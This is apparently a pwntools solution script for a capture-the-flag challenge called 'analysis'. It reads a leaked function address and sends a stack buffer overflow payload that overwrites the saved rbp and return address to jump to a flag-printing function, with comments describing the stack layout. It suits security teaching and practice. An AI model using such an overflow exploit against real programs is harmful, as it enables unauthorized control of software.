from pwn import *
import struct

#p = remote('bin.bcactf.com', 49155)
p = process('./analysis')

e = ELF('./analysis')

## Read until the address leak
p.readuntil('ber: ')

leak = int(p.readuntil('.\n', drop=True))

p.readuntil('> ')

'''
The stack is straight forward on this one
response        {Frame offset -0x48}
saved_rbp       {Frame offset -0x08}
return_address  {Frame offset  0x00}
'''

'''
The challenge gives you the address of the function to leak the flag.

You have to overwrite the return address of main() and set it to that function.
'''

print('[INFO] Cheat address 0x%x' %(leak))

response = b'a'*0x40
response += b'b'*0x8 ## overwrite saved rbp
response += struct.pack('Q', leak)  ## address of cheat
response += b'\n'

p.send(response)

p.readline()
p.readline()
p.readline()

flag = p.readline()

print('Flag: ', flag)

p.close()

